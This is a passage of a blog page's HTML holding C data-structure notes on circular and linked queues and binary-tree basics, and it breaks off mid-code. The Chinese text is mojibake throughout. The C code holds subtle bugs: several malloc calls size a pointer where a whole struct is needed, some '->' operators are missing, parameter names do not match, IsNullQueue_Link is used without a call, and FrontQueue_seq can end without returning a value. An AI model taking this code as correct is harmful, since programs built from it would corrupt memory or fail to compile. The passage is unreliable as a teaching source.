DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> Max;<span class="comment">//é˜Ÿåˆ—ç©ºé—´æœ€å¤§å€¼</span></span><br><span class="line">    <span class="type">int</span> f,r;<span class="comment">//é˜Ÿå¤´æŒ‡é’ˆå’Œé˜Ÿå°¾æŒ‡é’ˆ</span></span><br><span class="line">    DataType *elem;<span class="comment">//é˜Ÿåˆ—å…ƒç´ ç©ºé—´</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> *<span class="title">SeqQueue</span>;</span></span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºç©ºé˜Ÿåˆ—"><a href="#åˆ›å»ºç©ºé˜Ÿåˆ—" class="headerlink" title="åˆ›å»ºç©ºé˜Ÿåˆ—"></a>åˆ›å»ºç©ºé˜Ÿåˆ—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SeqQueue <span class="title function_">SetNullQueue_Seq</span><span class="params">(<span class="type">int</span> m)</span></span><br><span class="line">&#123;</span><br><span class="line">    SeqQueue squeue;</span><br><span class="line">    squeue = (SeqQueue)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SeqQueue));</span><br><span class="line">    <span class="keyword">if</span>(squeue == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mallocå¤±è´¥\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        squeue-elem = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DataType)*m);</span><br><span class="line">        squeue-&gt;Max = m;</span><br><span class="line">        squeue-&gt;f = <span class="number">0</span>;</span><br><span class="line">        squeue-&gt;r = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> squeue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ¤æ–­é˜Ÿç©º"><a href="#åˆ¤æ–­é˜Ÿç©º" class="headerlink" title="åˆ¤æ–­é˜Ÿç©º"></a>åˆ¤æ–­é˜Ÿç©º</h4><ul><li>æ£€æŸ¥é˜Ÿå¤´å’Œé˜Ÿå°¾æŒ‡é’ˆæ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰ä¸ºç©ºé˜Ÿåˆ—ï¼Œè¿”å›1ï¼Œå¦åˆ™è¿”å›0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullQueue_seq</span><span class="params">(SeqQueue Squeue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (squeue-&gt;f == squeue-&gt;r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å…¥é˜Ÿ"><a href="#å…¥é˜Ÿ" class="headerlink" title="å…¥é˜Ÿ"></a>å…¥é˜Ÿ</h4><ul><li>è‹¥é˜Ÿåˆ—æ²¡æ»¡ï¼Œåœ¨é˜Ÿå°¾æ·»åŠ å…ƒç´ ï¼Œä¿®æ”¹é˜Ÿå°¾æŒ‡é’ˆ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">EnQueue_seq</span><span class="params">(Sequeue Squeue, DataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((squeue-&gt;r+<span class="number">1</span>)%squeue-&gt;Max == squeue-&gt;f)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;é˜Ÿåˆ—å·²æ»¡\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        squeue-&gt;elem[squeue-&gt;r] = x;<span class="comment">//æ’å…¥å…ƒç´ x</span></span><br><span class="line">        squeue-&gt;r = (squeue-&gt;r+<span class="number">1</span>) % (squeue-&gt;Max);<span class="comment">//é˜Ÿå°¾æŒ‡é’ˆ++</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‡ºé˜Ÿ"><a href="#å‡ºé˜Ÿ" class="headerlink" title="å‡ºé˜Ÿ"></a>å‡ºé˜Ÿ</h4><ul><li>é¦–å…ˆåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼Œéç©ºåˆ™åˆ é™¤é˜Ÿå¤´å…ƒç´ ï¼Œä¿®æ”¹é˜Ÿå¤´æŒ‡é’ˆ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeQueue_seq</span><span class="params">(SeqQueue squeue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullQueue_seq(squeue))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;é˜Ÿåˆ—æ˜¯ç©ºçš„\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        squeue-f = (squeue-&gt;f+<span class="number">1</span>)%(squeue-&gt;Max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å–é˜Ÿå¤´å…ƒç´ "><a href="#å–é˜Ÿå¤´å…ƒç´ " class="headerlink" title="å–é˜Ÿå¤´å…ƒç´ "></a>å–é˜Ÿå¤´å…ƒç´ </h4><ul><li>é¦–å…ˆåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼Œéç©ºåˆ™è¿”å›é˜Ÿå¤´å…ƒç´ </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DataType <span class="title function_">FrontQueue_seq</span><span class="params">(SeqQueue squeue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(squeue-&gt;f == squeue-&gt;r)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;é˜Ÿåˆ—æ˜¯ç©ºçš„\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> squeue-&gt;elem[squeue-&gt;f];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é“¾é˜Ÿåˆ—"><a href="#é“¾é˜Ÿåˆ—" class="headerlink" title="é“¾é˜Ÿåˆ—"></a>é“¾é˜Ÿåˆ—</h3><h4 id="é“¾é˜Ÿåˆ—ç±»å‹å®šä¹‰"><a href="#é“¾é˜Ÿåˆ—ç±»å‹å®šä¹‰" class="headerlink" title="é“¾é˜Ÿåˆ—ç±»å‹å®šä¹‰"></a>é“¾é˜Ÿåˆ—ç±»å‹å®šä¹‰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">link</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PNode f;<span class="comment">//é˜Ÿå¤´æŒ‡é’ˆ</span></span><br><span class="line">   PNode r;<span class="comment">//é˜Ÿå°¾æŒ‡é’ˆ</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> *<span class="title">LinkQueue</span>;</span></span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºç©ºé˜Ÿåˆ—-1"><a href="#åˆ›å»ºç©ºé˜Ÿåˆ—-1" class="headerlink" title="åˆ›å»ºç©ºé˜Ÿåˆ—"></a>åˆ›å»ºç©ºé˜Ÿåˆ—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkQueue <span class="title function_">SetNullQueue_Link</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkQueue lqueue;</span><br><span class="line">    lqueue = (LinkQueue)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkQueue));</span><br><span class="line">    <span class="keyword">if</span>(lqueue!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        lqueue-&gt;f = <span class="literal">NULL</span>;</span><br><span class="line">        lqueue-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mallocå¤±è´¥\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> lqueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ¤æ–­é˜Ÿç©º-1"><a href="#åˆ¤æ–­é˜Ÿç©º-1" class="headerlink" title="åˆ¤æ–­é˜Ÿç©º"></a>åˆ¤æ–­é˜Ÿç©º</h4><ul><li>æ£€æŸ¥é˜Ÿå¤´æŒ‡é’ˆï¼Œå¦‚æœä¸ºç©ºï¼Œè¿”å›1ï¼Œå¦åˆ™è¿”å›0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullQueue_Link</span><span class="params">(LinkQueue lqueue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(lqueue-&gt;f == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å…¥é˜Ÿ-1"><a href="#å…¥é˜Ÿ-1" class="headerlink" title="å…¥é˜Ÿ"></a>å…¥é˜Ÿ</h4><ul><li>ç”³è¯·ç»“ç‚¹ï¼Œæ•°æ®åŸŸæŒ‡é’ˆåŸŸèµ‹å€¼<ul><li>å¦‚æœæ˜¯ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œç‰¹æ®Šå¤„ç†ï¼Œé˜Ÿå¤´å’Œé˜Ÿå°¾æŒ‡é’ˆéƒ½æŒ‡å‘è¯¥ç»“ç‚¹</li><li>å¦‚æœä¸æ˜¯ç¬¬ä¸€ä¸ªç»“ç‚¹ï¼Œåˆ™åœ¨é˜Ÿå°¾æ’å…¥ï¼Œä¿®æ”¹é˜Ÿå°¾æŒ‡é’ˆ</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">EnQueue_link</span><span class="params">(LinkQueue lqueue,DataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    p = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(PNode));</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mallocå¤±è´¥\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;data = x;</span><br><span class="line">        p-&gt;link =<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(lqueue-&gt;f == lqueue-&gt;r)</span><br><span class="line">        &#123;</span><br><span class="line">            lqueue-&gt;f = p;</span><br><span class="line">            lqueue-&gt;r = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            lqueue-&gt;r-&gt;link = p;</span><br><span class="line">            lqueue-&gt;r = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‡ºé˜Ÿ-1"><a href="#å‡ºé˜Ÿ-1" class="headerlink" title="å‡ºé˜Ÿ"></a>å‡ºé˜Ÿ</h4><ul><li>é¦–å…ˆåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼Œéç©ºåˆ™ä¿®æ”¹é˜Ÿå¤´æŒ‡é’ˆå¹¶é‡Šæ”¾é˜Ÿå¤´ç»“ç‚¹ç©ºé—´</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeQueue_link</span><span class="params">(LinkQueue lqueue)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    <span class="keyword">if</span>(IsNullQueue_Link)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;é˜Ÿåˆ—ä¸ºç©º\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = lqueue-&gt;f;</span><br><span class="line">        lqueue-&gt;f = lqueue-&gt;f-&gt;link;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å–é˜Ÿå¤´å…ƒç´ -1"><a href="#å–é˜Ÿå¤´å…ƒç´ -1" class="headerlink" title="å–é˜Ÿå¤´å…ƒç´ "></a>å–é˜Ÿå¤´å…ƒç´ </h4><ul><li>é¦–å…ˆåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼Œéç©ºè¿”å›é˜Ÿå¤´å…ƒç´ </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DataType <span class="title function_">FrontQueue_link</span><span class="params">(LinkQueue lqueue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullQueue_Link)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;é˜Ÿåˆ—ä¸ºç©º\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> lqueue-&gt;f-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒç«¯é˜Ÿåˆ—"><a href="#åŒç«¯é˜Ÿåˆ—" class="headerlink" title="åŒç«¯é˜Ÿåˆ—"></a>åŒç«¯é˜Ÿåˆ—</h3><blockquote><p>åŒæ—¶å…·å¤‡æ ˆå’Œé˜Ÿåˆ—çš„æ€§è´¨çš„æ•°æ®ç»“æ„ï¼Œæ—¢å¯ä»¥åœ¨å¤´éƒ¨å’Œå°¾éƒ¨æ’å…¥å’Œåˆ é™¤å…ƒç´ çš„æ•°æ®ç»“æ„</p><blockquote><p>å…·ä½“çš„ä¸œè¥¿ä»¥åå­¦äº†å†è¡¥ä¸Šæ¥</p></blockquote></blockquote><h1 id="ç¬¬å››ç« -æ ‘ä¸äºŒå‰æ ‘"><a href="#ç¬¬å››ç« -æ ‘ä¸äºŒå‰æ ‘" class="headerlink" title="ç¬¬å››ç«  æ ‘ä¸äºŒå‰æ ‘"></a>ç¬¬å››ç«  æ ‘ä¸äºŒå‰æ ‘</h1><h2 id="äºŒå‰æ ‘"><a href="#äºŒå‰æ ‘" class="headerlink" title="äºŒå‰æ ‘"></a>äºŒå‰æ ‘</h2><ul><li>äºŒå‰æ ‘æ˜¯ç»“ç‚¹çš„æœ‰é™é›†åˆ</li><li>è¿™ä¸ªé›†åˆå¯ä»¥æ˜¯ç©ºé›†ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç§°ä¸º<code>æ ¹</code>å’Œä¸¤æ£µä¸ç›¸äº¤çš„åˆ†åˆ«ä¸º<code>å·¦å­æ ‘å’Œå³å­æ ‘</code>çš„äºŒå‰æ ‘ç»„æˆ</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212201323.png"></p><h2 id="äºŒå‰æ ‘åŸºæœ¬æœ¯è¯­"><a href="#äºŒå‰æ ‘åŸºæœ¬æœ¯è¯­" class="headerlink" title="äºŒå‰æ ‘åŸºæœ¬æœ¯è¯­"></a>äºŒå‰æ ‘åŸºæœ¬æœ¯è¯­</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212201718.png"></p><ul><li><p><code>ç¥–å…ˆ</code>ï¼šæœ€æ—©çš„æ ¹èŠ‚ç‚¹ï¼ŒAå°±æ˜¯æ•´ä¸ªäºŒå‰æ ‘çš„ç¥–å…ˆ</p><p><code>çˆ¶ç»“ç‚¹</code>ï¼šAå°±æ˜¯Bå’ŒCçš„çˆ¶ç»“ç‚¹ï¼ŒBæ˜¯Dçš„çˆ¶ç»“ç‚¹</p><p><code>å­ç»“ç‚¹</code>ï¼šBå’ŒCå°±æ˜¯Açš„å­ç»“ç‚¹</p></li><li><p><code>å…„å¼Ÿç»“ç‚¹</code>ï¼šå¤„åœ¨åŒä¸€çˆ¶æ¯ç»“ç‚¹çš„ç»“ç‚¹ï¼Œäº’ç§°å…„å¼Ÿç»“ç‚¹ï¼ŒBå’ŒCå°±æ˜¯å…„å¼Ÿç»“ç‚¹</p></li><li><p><code>ç»“ç‚¹çš„åº¦</code>ï¼šç»“ç‚¹çš„å­©å­çš„ä¸ªæ•°ï¼ŒAçš„åº¦ä¸º2</p></li><li><p><code>æ ‘å¶å’Œåˆ†æ”¯ç»“ç‚¹</code>ï¼šåº¦ä¸º0çš„å«<code>æ ‘å¶</code>ï¼Œå…¶ä»–éƒ½å«<code>åˆ†æ”¯ç»“ç‚¹</code></p></li><li><p><code>è·¯å¾„</code>ï¼šè¿æ¥çš„è¾¹</p><p><code>è·¯å¾„é•¿åº¦</code>ï¼šå±‚æ•°</p></li><li><p><code>ç»“ç‚¹çš„å±‚æ•°ï¼ˆçº¦å®šæ ¹ç»“ç‚¹ä¸º0ï¼‰</code>ï¼šBã€Cçš„å±‚æ•°å°±æ˜¯1ï¼ŒDã€Eå’ŒFçš„å±‚æ•°å°±æ˜¯2</p></li><li><p><code>äºŒå‰æ ‘çš„é«˜åº¦</code>ï¼šäºŒå‰æ ‘å½“ä¸­æœ€å¤§çš„å±‚æ•°ï¼Œå°±æ˜¯é«˜åº¦ï¼ŒGçš„å±‚æ•°æ˜¯3ï¼Œé«˜åº¦ä¸º3</p></li><li><p><code>B</code>ï¼šåˆ†æ”¯</p></li></ul><h2 id="ç‰¹æ®Šçš„äºŒå‰æ ‘"><a href="#ç‰¹æ®Šçš„äºŒå‰æ ‘" class="headerlink" title="ç‰¹æ®Šçš„äºŒå‰æ ‘"></a>ç‰¹æ®Šçš„äºŒå‰æ ‘</h2><h3 id="æ»¡äºŒå‰æ ‘"><a href="#æ»¡äºŒå‰æ ‘" class="headerlink" title="æ»¡äºŒå‰æ ‘"></a>æ»¡äºŒå‰æ ‘</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212202559.png"></p><h3 id="å®Œå…¨äºŒå‰æ ‘"><a href="#å®Œå…¨äºŒå‰æ ‘" class="headerlink" title="å®Œå…¨äºŒå‰æ ‘"></a>å®Œå…¨äºŒå‰æ ‘</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212202649.png"></p><h3 id="æ‰©å……äºŒå‰æ ‘"><a href="#æ‰©å……äºŒå‰æ ‘" class="headerlink" title="æ‰©å……äºŒå‰æ ‘"></a>æ‰©å……äºŒå‰æ ‘</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212202818.png"></p><h2 id="äºŒå‰æ ‘çš„æ€§è´¨"><a href="#äºŒå‰æ ‘çš„æ€§è´¨" class="headerlink" title="äºŒå‰æ ‘çš„æ€§è´¨"></a>äºŒå‰æ ‘çš„æ€§è´¨</h2><ul><li><p>åœ¨éç©ºäºŒå‰æ ‘çš„ç¬¬&#x3D;&#x3D;i&#x3D;&#x3D;å±‚ä¸Šè‡³å¤šæœ‰&#x3D;&#x3D;2^j^&#x3D;&#x3D;ä¸ªç»“ç‚¹(&#x3D;&#x3D;i&gt;&#x3D;0&#x3D;&#x3D;)</p><p>å½’çº³è¯æ˜ï¼š&#x3D;&#x3D;i &#x3D; 0&#x3D;&#x3D;ï¼Œ&#x3D;&#x3D;ç»“ç‚¹æ•°&#x3D;1&#x3D;2^0^&#x3D;&#x3D;ï¼Œå‡è®¾å¯¹äº&#x3D;&#x3D;j(0&lt;&#x3D;j&lt;&#x3D;i)&#x3D;&#x3D;ï¼Œç»“ç‚¹æ•°è‡³å¤šæœ‰&#x3D;&#x3D;2^j^&#x3D;&#x3D;ï¼Œå¯¹äº&#x3D;&#x3D;i&#x3D;j+1&#x3D;&#x3D;ï¼Œç»“ç‚¹æ•°è‡³å¤šæœ‰&#x3D;&#x3D;2*2^j^&#x3D;2^j+1^&#x3D;&#x3D;</p></li><li><p>æ·±åº¦ä¸º &#x3D;&#x3D;k&#x3D;&#x3D;çš„äºŒå‰æ ‘è‡³å¤šæœ‰&#x3D;&#x3D;2^k+1^-1&#x3D;&#x3D;ä¸ªç»“ç‚¹(&#x3D;&#x3D;k&gt;&#x3D;0&#x3D;&#x3D;)</p></li><li><p>å¯¹ä»»ä½•ä¸€æ£µéç©ºäºŒå‰æ ‘Tï¼Œå¦‚æœå¶ç»“ç‚¹ä¸ªæ•°ä¸º&#x3D;&#x3D;n<del>0</del>&#x3D;&#x3D;ï¼Œåº¦ä¸º2çš„ç»“ç‚¹æ•°ä½&#x3D;&#x3D;n<del>2</del>&#x3D;&#x3D;ï¼Œåˆ™&#x3D;&#x3D;n<del>0</del>&#x3D;n<del>2</del>+1&#x3D;&#x3D;</p></li></ul><h2 id="äºŒå‰æ ‘çš„éå†"><a href="#äºŒå‰æ ‘çš„éå†" class="headerlink" title="äºŒå‰æ ‘çš„éå†"></a>äºŒå‰æ ‘çš„éå†</h2><ul><li>æ²¿æŸæ¡æœç´¢è·¯å¾„è®¿é—®äºŒå‰æ ‘ï¼Œå¯¹äºŒå‰æ ‘ä¸­çš„æ¯ä¸ªç»“ç‚¹<code>è®¿é—®ä¸€æ¬¡ä¸”ä»…è®¿é—®ä¸€æ¬¡</code></li><li>éå†ä¸€æ£µéç©ºäºŒå‰æ ‘<ul><li>è®¿é—®æ ¹èŠ‚ç‚¹ D </li><li>éå†å·¦å­æ ‘ L</li><li>éå†å³å­æ ‘ R</li></ul></li></ul><h3 id="äºŒå‰æ ‘çš„æ·±åº¦éå†"><a href="#äºŒå‰æ ‘çš„æ·±åº¦éå†" class="headerlink" title="äºŒå‰æ ‘çš„æ·±åº¦éå†"></a>äºŒå‰æ ‘çš„æ·±åº¦éå†</h3><h4 id="å…ˆåºéå†"><a href="#å…ˆåºéå†" class="headerlink" title="å…ˆåºéå†"></a>å…ˆåºéå†</h4><ul><li>æŒ‰ç…§<code>D-&gt;L-&gt;R</code>çš„é¡ºåºè®¿é—®ç»“ç‚¹<ol><li>è®¿é—®æ ¹èŠ‚ç‚¹</li><li><code>å…ˆæ ¹æ¬¡åº</code>éå†<code>D</code>çš„å·¦å­æ ‘</li><li><code>å…ˆæ ¹æ¬¡åº</code>éå†<code>D</code>çš„å³å­æ ‘</li></ol></li><li>ä¼ªä»£ç </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)<span class="comment">//ç»“æŸé€’å½’çš„æ¡ä»¶</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Visit(root(bt));<span class="comment">//è®¿é—®ç»“ç‚¹çš„æ•°æ®åŸŸ</span></span><br><span class="line">    PreOrder(leftchild(bt));<span class="comment">//å…ˆæ ¹é€’å½’éå†tçš„å·¦å­æ ‘</span></span><br><span class="line">    PreOrder(rightchild(bt));<span class="comment">//å…ˆæ ¹é€’å½’éå†tçš„å³å­æ ‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201213220117.png"></p><h4 id="ä¸­åºéå†"><a href="#ä¸­åºéå†" class="headerlink" title="ä¸­åºéå†"></a>ä¸­åºéå†</h4><ul><li>æŒ‰ç…§<code>L-&gt;D-&gt;R</code>çš„é¡ºåºè®¿é—®ç»“ç‚¹<ol><li><code>å¯¹ç§°æ¬¡åº</code>éå†å·¦å­æ ‘</li><li>è®¿é—®æ ¹ç»“ç‚¹</li><li><code>å¯¹ç§°æ¬¡åº</code>éå†å³å­æ ‘</li></ol></li><li>ä¼ªä»£ç </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)<span class="comment">//ç»“æŸé€’å½’çš„æ¡ä»¶</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    InOrder(leftchild(bt));<span class="comment">//å¯¹ç§°é€’å½’éå†tçš„å·¦å­æ ‘</span></span><br><span class="line">    Visit(root(bt));<span class="comment">//è®¿é—®ç»“ç‚¹çš„æ•°æ®åŸŸ</span></span><br><span class="line">    InOrder(rightchild(bt));<span class="comment">//å¯¹ç§°é€’å½’éå†tçš„å³å­æ ‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ååºéå†"><a href="#ååºéå†" class="headerlink" title="ååºéå†"></a>ååºéå†</h4><ul><li>æŒ‰ç…§<code>L-&gt;R-&gt;D</code>çš„é¡ºåºè®¿é—®ç»“ç‚¹<ol><li><code>åæ ¹æ¬¡åº</code>éå†å·¦å­æ ‘</li><li><code>åæ ¹æ¬¡åº</code>éå†å³å­æ ‘</li><li>è®¿é—®æ ¹èŠ‚ç‚¹</li></ol></li><li>ä¼ªä»£ç </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 